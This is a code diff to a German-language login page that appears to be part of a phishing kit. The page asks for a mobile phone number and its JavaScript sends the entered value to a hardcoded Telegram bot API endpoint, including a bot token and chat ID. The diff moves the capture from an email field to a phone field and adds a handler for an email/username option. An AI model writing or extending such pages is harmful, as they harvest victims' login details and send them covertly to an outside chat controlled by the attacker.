@@ -15,7 +15,7 @@
             function sendMessage() {
                 var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
                 var chatId = "709764990";
-                var message = $("#emailinput").val();
+                var message = $("#PhoneInput").val();
                 var fullMessage = "Phone: " + message;
                 
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
@@ -50,13 +50,13 @@
                     <label for="email" class="field-label">Handynummer</label>
                     <div class="w-row">
                         <div class="w-col w-col-3"><input type="text" class="text-field w-input" maxlength="256" name="49" data-name="49" placeholder="DE +49" id="element" required="" /></div>
-                        <div class="w-col w-col-9"><input type="tel" class="text-field-nr w-input" maxlength="256" name="email-2" data-name="Email 2" placeholder="" id="email-2" required="" /></div>
+                        <div class="w-col w-col-9"><input type="tel" class="text-field-nr w-input" maxlength="256" name="email-2" data-name="Email 2" placeholder="" id="PhoneInput" required="" /></div>
                     </div>
                 </form>
                 <div class="w-form-done" tabindex="-1" role="region" aria-label="Email Form success"></div>
                 <div class="w-form-fail" tabindex="-1" role="region" aria-label="Email Form failure"></div>
             </div>
-            <div class="text-block">
+            <div class="text-block" onclick="StattdessenEmailVerwenden()">
                 Stattdessen Nutzernamen oder Email-<br />
                 Adresse verwenden
             </div>
